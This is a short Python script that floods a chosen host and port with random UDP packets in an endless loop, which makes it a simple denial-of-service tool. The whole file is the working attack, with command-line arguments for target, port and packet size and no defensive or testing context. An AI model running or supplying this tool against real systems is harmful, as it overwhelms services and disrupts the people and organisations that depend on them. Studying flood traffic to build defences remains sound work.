import socket
import random
import sys

def usage():
    print("Usage: %s <target> <port> <size>" % sys.argv[0])
    sys.exit(1)

def flood(target, port, size):
    # create a socket
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 16777216 = 2^24
    bytes = random._urandom(size)
    while True:
        client.sendto(bytes, (target, port))
        print("Sent %s amount of packets to %s at port %s." % (size, target, port))

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
